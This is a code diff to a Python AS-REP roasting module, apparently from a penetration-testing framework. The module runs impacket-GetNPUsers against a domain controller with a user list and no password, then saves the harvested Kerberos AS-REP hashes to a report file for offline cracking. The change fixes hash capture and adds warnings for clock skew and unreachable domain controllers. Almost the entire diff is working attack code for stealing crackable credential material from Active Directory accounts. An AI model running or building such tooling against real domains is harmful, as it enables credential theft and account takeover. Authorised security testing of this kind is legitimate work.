@@ -201,31 +201,66 @@ class ASREPRoastingModule:
         )
         _write_userlist(user_pool, tmp_path)
 
+        # Determine output hash file path up front so we can pass it to the
+        # command AND read it back after execution.
+        os.makedirs(REPORTS_DIR, exist_ok=True)
+        hash_file_path = os.path.abspath(
+            os.path.join(REPORTS_DIR, f"{state.assessment_id}-asrep.txt")
+        )
+
         # ── Run GetNPUsers ──────────────────────────────────────────────
-        # Command mirrors user's playbook:
-        # impacket-GetNPUsers VulnAD.ma/ -usersfile users-rid.txt
+        # Matches the user's working playbook command:
+        #   impacket-GetNPUsers VulnAD.ma/ -usersfile users.txt -dc-ip <IP> -no-pass
+        #
+        # IMPORTANT: do NOT use -outputfile /dev/null — impacket writes hashes
+        # to the output file, NOT to stdout.  We point it at the real report file
+        # so we can read hashes back from disk.
         command = [
             binary,
             f"{domain}/",
             "-usersfile", tmp_path,
-            "-dc-ip", target,
+            "-dc-ip",     target,
             "-no-pass",
-            "-outputfile", "/dev/null",  # we capture via stdout instead
+            "-outputfile", hash_file_path,
         ]
 
-        result = self.executor.run(command)
+        from rich.console import Console as _RCon
+        _RCon().print(
+            f"  [dim]Command: {binary} {domain}/ -usersfile <users.txt> "
+            f"-dc-ip {target} -no-pass -outputfile <hash_file>[/dim]"
+        )
+
+        result   = self.executor.run(command)
         combined = result["output"] + "\n" + result["error"]
 
-        # ── Parse hashes ────────────────────────────────────────────────
-        hashes          = _parse_hashes(combined)
-        vulnerable_users = _parse_vulnerable_users(combined)
+        # ── Parse hashes (file first, stdout fallback) ──────────────────
+        # GetNPUsers writes hashes to -outputfile; stdout just shows progress.
+        # Always try reading the file; also scan stdout in case the binary
+        # behaves differently on this install.
+        hashes: list[str] = []
+
+        if os.path.isfile(hash_file_path):
+            try:
+                with open(hash_file_path, "r", encoding="utf-8", errors="replace") as fh:
+                    file_content = fh.read()
+                hashes = _parse_hashes(file_content)
+            except OSError:
+                pass
 
         if not hashes:
-            # Check for common error patterns
+            # Fallback: parse stdout/stderr directly
+            hashes = _parse_hashes(combined)
+
+        vulnerable_users = _parse_vulnerable_users("\n".join(hashes))
+
+        if not hashes:
+            # Check for common error patterns to give actionable warnings
             if "kerberos sessionerror" in combined.lower():
                 warnings.append("Kerberos session error — DC may be unreachable or domain incorrect.")
             if "clock skew" in combined.lower():
-                warnings.append("Clock skew too large — sync time with DC: ntpdate <dc_ip>")
+                warnings.append("Clock skew too large — sync time with DC: sudo ntpdate " + target)
+            if "connection refused" in combined.lower() or "timed out" in combined.lower():
+                warnings.append(f"Cannot reach DC on port 88 — verify {target} is correct and port 88 is open.")
             return {
                 "status":           "success",
                 "hashes":           [],
@@ -233,12 +268,14 @@ class ASREPRoastingModule:
                 "vulnerable_users": [],
                 "mode":             mode,
                 "crack_command":    "",
+                "raw_output":       combined,
                 "error":            None,
                 "warnings":         warnings + [
                     "No AS-REP hashes returned — either all accounts require pre-auth, "
-                    "or the DC blocked the request."
+                    "or the DC blocked the request.",
                 ],
             }
+
 
         # ── Save hashes to file ─────────────────────────────────────────
         hash_file    = _save_hash_file(hashes, state.assessment_id)
